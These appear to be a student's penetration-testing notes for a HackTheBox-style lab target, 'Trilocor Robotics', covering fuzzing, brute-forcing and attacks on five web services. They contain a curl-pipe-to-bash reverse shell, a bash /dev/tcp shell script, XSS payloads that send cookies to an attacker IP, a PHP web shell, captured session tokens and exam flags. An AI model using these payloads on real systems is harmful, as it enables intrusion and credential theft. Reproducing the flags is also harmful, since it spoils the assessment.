# Trilocor Robotics Ltd. Notes
## General
IP:
```
10.129.205.208
```

| URL                             | Description           |
| ------------------------------- | --------------------- |
| www.trilocor.local:80           | Main Trilocor website |
| http://www.trilocor.local:8009  | PR website            |
| http://www.trilocor.local:8080/ | Jobs portal           |
| http://www.trilocor.local:8088  | HR website            |
| http://www.trilocor.local:9000  | Online shop           |

# Testing Notes
Go through all sites looking for:
- HTTP Verb Tampering [[Cybersecurity/CBBH Modules/2. Authentication & Session Handling/4. HTTP Verb Tampering/Reference|Reference]]
- Command Injection
	- In front of JSON data on APIs
	- Everywhere on POST requests where data is being sent/requested 
		- Use the following to test for this:
		- payload: `curl http://10.10.14.17:80/rev.sh|bash`
			- **Don't URL encode first, then URL encode if it doesn't work**
		- Listen with python server: `python -m http.server 80`
		- Make file called `rev.sh`: `#!/bin/bash \n /bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.17/4561 0>&1'`
- Test ALL input fields (password reset forms) for sqli with simple payloads
	- only if then you find vulnerability, use sqlmap
- Run Nikto on "unauthorized" directories
	- if you find "cookie created without httponly flag" we can:
		- start python server: `python3 -m http.server 80`
		- put xss payload in User-Agent header: `"<img src=x onerror=fetch('http://10.10.14.17/?c='+document.cookie;>"`
		- send this in burp and now you should be authorized now by using stolen cookie
- Javascript DE obfuscation everything!
- Check `Network` when viewing developer tools on each page
## Main Site: www.trilocor.local:80
**Fuzzing:**
```
ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.trilocor.local
```
- Subdomains Found: 
	- admin (wp site)
	- blog
```
ffuf -w directory-list-2.3-small.txt:FUZZ -u http://www.trilocor.local:80/FUZZ -recursion -recursion-depth 3 -v
```
- Directories Found:
	- wp-content (admin subd)
	- wp-includes (admin subd)
	- wp-admin (admin subd)
		-  admin-ajax.php
	- wp-login.php (admin subd)
	- index.php
	- robots.txt
	- ?s=test
		- search page
		- Tested for command injection (nothing)
	- /wp-content/plugins/secure_testimonials/post-testimonial.php
	- /wp-admin/admin-ajax.php

**Form:** `http://www.trilocor.local/index.php/testimonials/`
Fields: 
- Full name (Vulnerable to XSS): 
```
<script src=http://10.10.14.17/script.js></script>
```
base64 output:
```
wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1749916858%7CkmZRYiJ7i7lnr7whCUvaQX8RYbqpTv6aHK18SDGOhVD%7C9880712799bb0f54d48842ab5b2429284d4560667c62ce9c72242cbfa18fbf83;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1749916858%7CkmZRYiJ7i7lnr7whCUvaQX8RYbqpTv6aHK18SDGOhVD%7Ce6e877eb7e99558b9275c62092f0a90903135940e933206c2c06dacaf9854710;%20wordpress_test_cookie=WP%20Cookie%20check
```
- We now go to http://admin.trilocor.local/wp-admin/ (which was found with ZAP spidering) and paste this cookie as the new cookie value
- logs us in and we get the first flag: 098b2be9a3c24d54bdd15f3e26c1528e 

Can login as web-editor
- email: editor@trilocor.local

**Technologies:** Wappalyzer
- CMS & Blogs: WordPress 6.0.2
- WordPress plugins: Elementor 3.7.7
- Databases: MySQL
- OS: Ubuntu
- Web Server: Apache 2.4.41
- Programming Languages: PHP

**Robots.txt**
- User-agent: *
- Disallow: /wp-admin/
- Allow: /wp-admin/admin-ajax.php
- Sitemap: http://www.trilocor.local/wp-sitemap.xml

**Search Page:**
- http://www.trilocor.local/?s=test
	- Output of search is reflected on the page
- Not vulnerable to sqli
- Not vulnerable to SSTI
- Not vulnerable to command injection

**Admin Page:**
- http://www.trilocor.local/wp-admin/

**Cookies:**
- `Cookie: PHPSESSID=4chrgj92lptfic8k2jtn0hn260`

**WordPress:**
- WP-Cron enabled
- WP Version: 6.0.2
- WP Theme: Astra 3.9.2 (Semi-Outdated)
- WP Plugins: Elementor 3.7.7 (semi-outdated)
- XML-RPC enabled: server accepts POST requests only. (cant do anything)
- Users: web-admin (id:1, http://www.trilocor.local/index.php/author/web-admin/), pr-martins, hr-smith, r.batty, trilocor.Shiv, trilocor.Gradin, trilocor.Vagient, trilocor.Fankle'

**WordPress Admin Enumeration:**
- When visiting the file manager page, I tried file inclusion in url, and it would work if i switched to POST requests, but nothing would display
	- Also tried command injection but same thing

**Forbidden:**
- Login page at: http://www.trilocor.local/wp-login.php
- Admin page at: http://www.trilocor.local/index.php/author/web-admin/

**xmlrpc**:
- Performed brute force password attack with rockyou against web-admin
	- went on all night, was only 5% through
	- Re-trying with xato top 10000 passwords (nothing)

## HR Website: http://www.trilocor.local:8088
**Pages:**
- Login: http://www.trilocor.local:8088/index.php
- Script Page: http://www.trilocor.local:8088/script.js

**Fuzzing:**
- No subdomains (`ffuf -w subdomains-top1million-20000.txt:FUZZ -u http://www.trilocor.local:8088/ -H 'Host: FUZZ.trilocor.local' -fs 2457`)
	- also fuzzed for `/index.php/FUZZ` (nothing)
- Found directories
	- /assets/
		- includes files for fonts
	- /css/theme/assets/
		- file for fonts
	- /js
		- all js files (found employee PII under data.js)
	- /localization (nothing)
- Fuzzed for API functions (nothing)
	- `ffuf -w burp-parameter-names.txt -u 'http://www.trilocor.local:8088/?FUZZ=test_value' -fs 2457`
- Fuzzed for WSDL (nothing)
	- `ffuf -w burp-parameter-names.txt -u 'http://www.trilocor.local:8088/wsdl?FUZZ'`
- Not running WordPress
	

**Employees:**
- "id": 19,
        "Full Name": "Waylan Chaudrelle",
        "Job Title": "Systems Administrator III",
        "Country": "Sweden",
        "Gender": "M",
        "Part-time": "No",
        "University": "Dalarna University College",
        "Department": "Sales",
        "LinkedIn Skill": "Risk Assessment",
        "Employment start date": "10/26/2018",
        "Age Group": "41 - 50",
-         "id": 55,
        "Full Name": "Sheeree Lorman",
        "Job Title": "Human Resources Manager",
        "Country": "Ukraine",
        "Gender": "F",
        "Part-time": "No",
        "University": "Taurida National V.I.Vernadsky University",
        "Department": "Human Resources",
        "LinkedIn Skill": "Newspapers",
        "Employment start date": "6/14/2018",
        "Age Group": ">70",
> Created list of possible usernames and passwords with useranarchy and cupp and performed hydra brute force


**ZAProxy:**
- ZAProxy found no other directories, but found XSS Vuln:
```
#jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(5397) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(5397)//>\x3e
```
1. submit this at the end of url: http://www.trilocor.local:8088/PAYLOAD
2. Put it in as the username
3. Put it in as the password
4. Submit form, and alert will show

**Forbidden Pages:**
http://www.trilocor.local:8088/.htaccess
http://www.trilocor.local:8088/server-status

**Blacklisted Characters:** *invalid username*
- `'`
- `"`
- `\=`
- `\`
- ` `
**Allowed Characters:**
- `;`
- `-`
- `$`
> **Note:** no space can be appended to username

**Login Page:**
- No SQLi
- Tried brute-forcing with usernames from front PR site but nothing

**Outdated Objects:**
- Apache 2.4.41: tried path traversal for 2.4.49 but nothing
	- If we get a shell: CVE-2019-0211

## Jobs Portal: http://www.trilocor.local:8080/
Username: htbtest, htbshell

**Fuzzing:**
- No robots.txt
- No submdomains: `ffuf -w subdomains-top1million-20000.txt:FUZZ -u http://www.trilocor.local:8080/ -H 'Host: FUZZ.trilocor.local' -fs 0`
- Fuzzed for WSDL (nothing)
	- `ffuf -w burp-parameter-names.txt -u 'http://www.trilocor.local:8088/wsdl?FUZZ'`
- Fuzzed Uploads directory for php files (got /index.php but nothing)
	- `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://www.trilocor.local:8080/uploads/FUZZ.php`
- Fuzzed directories: `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://www.trilocor.local:8080/FUZZ -recursion -recursion-depth 3 -v`
	- uploads
	- assets
	- includes
	- dashboard.php

**Login:**
- Login: http://www.trilocor.local:8080/login.php
- Forgot Password: http://www.trilocor.local:8080/forgot.php
- sqlmap not vulnerable
- cant bruteforce login. Too many users
	- Wrong username and password: Error! Invalid username or password.
	- Wrong password, right username: Error! Invalid credentials.
- Reset `r.batty`s password (to password) through password reset and using ffuf to brute force the 4-digit 2fa code, which allowed us to login to get the flag: `f21868786b3f32fd875b6dac2167352e`

**File Upload:**
- Upload Resume: http://www.trilocor.local:8080/upload.php
	- Click 'Apply' on job dashboard to possibly bring forth file
	- or go to `/apply.php`
- `filename=file.pdf` needs to end in `.pdf` and have `%PDF-` as the first part of the content
- Went through [[Bypassing Filters]]
	- [[## Fuzzing Extensions]] Tested. None worked
	- [[## Double Extensions]] Tested. None worked
	- [[## Reverse Double Extension]] Tested. 
	- [[## Character Injection]] All Tested (before `.pdf`)
- Tested all extensions - All made same exact error:
	- File not allowed. Only PDF files can be uploaded.
- Tested Content-Type: can remove and request is still the same
- Tried msfvenom payload and using msfconsole listener but nothing
- Tried pentestmonkey and nc but nothing
- Tried command execution payload = nothing
- tried sqli, command injection, STTI, when submitting an application = nothing
- Files are saved as the md5 hash of the number of file that they are that are uploaded
	- Ex: File 2933 = 25766f01628f3d34b93a36a2301dffc9.pdf
- upload to /upload.php as POST request as r.batty (nothing)

Created all the following accounts with command injection to try to bypass:
```
%PDF-

<?php system($_REQUEST['cmd']); ?>
```
- `%20` - 20htbuser
- `%0a` - 0ahtbuser
- `%00` - 00htbuser
- `%0d0a` - 0dhtbuser
- `/` - /htbuser
- `.\` - \htbuser
- `.` - .htbuser
- `…` - ..htbuser
- `:` - :htbuser
- htbtest: shell.pdf  - zipped file
- htbshell: shell.pdf - phar file
	- also changed content type to `application/x-php` for all
- tried sending php script to display ls / in another file (nothing)
Nothing worked

- Tried sqli in password reset form but got nothing
- Found the name of files being displayed were in sequence to the order they were uploaded, then that order # was md5 hashed, leading to the name of the file. Tried md5 hashing previous numbers to access previous files but kept getting 404
- when submitting a file as the user to a job, i intercepted the request and changed 'job_id' to try SSTI, any file inclusion vulnerabilities, command injection, and sqli, but nothing

## PR Website: http://www.trilocor.local:8009
**Contact Us**
- Does nothing

**Users found on Team section**
- Metiew Smith @hr-smith
- Alexa Wilson @cco-wilson
- Andrew Martins @pr-martins
- Possible email from section 4: trilocor@trilocor.htb
- Possible email from shop:  administrator@trilocor.local 

**Admin Pane:**
- http://www.trilocor.local:8009/admin
	- Forgot Password function doesn't work
- incorrect login at all attempts: Invalid username or password!
- /admin/settings
- /admin/dashboard

**Fuzzing:** 
- No robots.txt
- /static (but forbidden)
- /views (forbidden)
- /models (forbidden)
- No subdomains found
- fuzzed for `.php` files with ffuf
	- /Database.php (nothing)
	- /Router.php (nothing)
- Couldn't find wsdl (`ffuf -w burp-parameter-names.txt -u 'http://www.trilocor.local:8009/wsdl?FUZZ' -fs 0 `)

**Brute-Forcing:**
- used ffuf to find usernames based on response (nothing)
- used hydra with list of users from main site and top200 passwords (nothing)
	- Tried again with new list of users from this site and rockyou
		- Went on all night and didnt get through first user
		- Ran again with list of top 10000 (nothing)
- used mysql with max level and risk (nothing)

Went through all sections, got nothing left here.



## Online Shop: http://www.trilocor.local:9000
**Fuzzing**
- No robots.txt
- Fuzzed for WSDL (nothing)
	- `ffuf -w burp-parameter-names.txt -u 'http://www.trilocor.local:9000/wsdl?FUZZ'`
- No subdomains
	- `ffuf -w subdomains-top1million-20000.txt:FUZZ -u http://www.trilocor.local:9000/ -H 'Host: FUZZ.trilocor.local' -fs 13121`
- Not running wordpress
- API requests being sent once logged in, so we fuzzed for endpoints:
	- `ffuf -w common-api-endpoints-mazen160.txt:FUZZ -u 'http://www.trilocor.local:9000/api/FUZZ' -recursion -recursion-depth 5 -fs 0` (nothing)

**Login**
- Username: htbtest
	- Password: password
- Ran sqlmap on login fields (nothing)

**API**:
- Fuzzed for api endpoints (got `/admin` and `/tokens`)
	-` ffuf -w common-api-endpoints-mazen160.txt:FUZZ -u 'http://www.trilocor.local:9000/api/tokens/FUZZ' -X POST -d '{"uid":"2","username":"matt","token":"2846e075-8142-49d1-8cb2-fdf8f68a9df4"}' -H 'Content-Type: application/json'`
- `/api/admin` response: 
	- `"message":"You must supply your API token."`
- Found another users uid:
	- when going through different uid's, we get a different response at uid = 5, indicating there is only 4 users
	- `ffuf -w xato-net-10-million-usernames.txt:FUZZ -u http://www.trilocor.local:9000/api/tokens -X POST -d '{"uid":"1","username":"FUZZ"}' -H 'Content-Type:application/json' -H 'Cookie: PHPSESSID=82c87olf0ndavfhrr9ps3cc8pd' -fs 51`
		- we find the user administrator with uid 1 and we can get their token
- Administrator token: `f19d77c3-753c-48d6-9430-4d1a09aea67d`
		- we now get their token and the first flag: `3c1ef7f4fd31813e5dbd8b53879ebfe9`
	- With this, we go to /api/admin and get the admins:
		- username: administrator
		- email: administrator@trilocor.local
- Endpoints:
	- /api/admin/list_members
		- uuid: uuid 
	- /api/admin/healthcheck
		- uuid: uuid, url: url.value
		- can send any url and it will go to it
	- /api/admin/add_product
		- uuid: uuid, productName: pname.value, productPrice: pprice.value 
		- Tried SSTI (nothing), SQLi (nothing), XSS (works but cant get anywhere), 
	- /api/projects/edit
	- /api/tokens

change administrators full name to:
```
<script src=http://10.10.14.17/script.js></script>
```
Then submit contact form that includes the source to go to their profile to trigger the xss

**Products API**
- We can place orders, capture the requests, and we can change only the price
	- try xss if all else fails on price to steal cookie from admin
	- SSTI (nothing)
	- SQLi (nothing)

**Pages:**
- Login: http://www.trilocor.local:9000/login
- Forgot Password Field
logging in with invalid anything: Invalid username or password
	Endpoints:
	- /assets/js/pages/dashboard.js
	- /assets/js/demo.js
	- /assets/js/adminlte.js

**Profile Page:**
- Update Profile: http://www.trilocor.local:9000/profile
	- User ID: 3 (may be able to view other users)
- Full Name: Vulnerable to XSS
	- also vulnerable to sqli?
	- It was displaying SQL syntax when putting in payloads such as `'`, but now it wont display anything and also ran sqlmap but got nothing on any fields

**Pages where user input is reflected:**
- Add Projects: http://www.trilocor.local:9000/projects/add
	- They are then displayed at http://www.trilocor.local:9000/projects
- Add Calendar Events: http://www.trilocor.local:9000/calendar
- All Orders: http://www.trilocor.local:9000/products/orders
	- May be able to place order, change info, then have it reflected here

**Contact Us:**
- http://www.trilocor.local:9000/contact
- Tested with XSS (nothing)

**API Users:**
- id: 1
	- is admin: 1
	- username: administrator
	- email: administrator@trilocor.local
- id: 2
	- is admin: 0
	- username: matt
	- email: thecybergeek@hackthebox.eu
- id: 3
	- is admin: 0
	- username: htbtest
	- email: htbtest@htb.com

## Retake notes
- takes extensive notes, take note of every tool, command, output, and location you used this on so you don't use things twice
- information gathering is key!!!

All usernames:
- administrator
-  trilocor@trilocor.htb
- administrator@trilocor.local 
- Metiew Smith @hr-smith
- Alexa Wilson @cco-wilson
- Andrew Martins @pr-martins
- pr-martins
- hr-smith
- r.batty
- trilocor.Shiv
- trilocor.Gradin
- trilocor.Vagient
- trilocor.Fankle